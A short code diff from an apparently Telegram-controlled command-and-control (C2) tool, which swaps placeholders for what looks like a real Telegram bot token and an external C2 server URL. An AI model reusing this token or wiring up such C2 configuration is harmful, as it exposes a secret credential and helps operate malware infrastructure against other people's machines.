@@ -3,8 +3,8 @@ from threading import Thread
 import time
 
 # Initialize bot
-bot = telebot.TeleBot("YOUR_TELEGRAM_BOT_TOKEN")
-c2_server_url = "http://localhost:5000"
+bot = telebot.TeleBot("7526583138:AAH-mPmh54YgDIqn7cZO1AP8_3xlSPeDgn4")
+c2_server_url = "https://workplacebd.github.io/C2-server-/"
 
 # Store active users
 active_users = {}
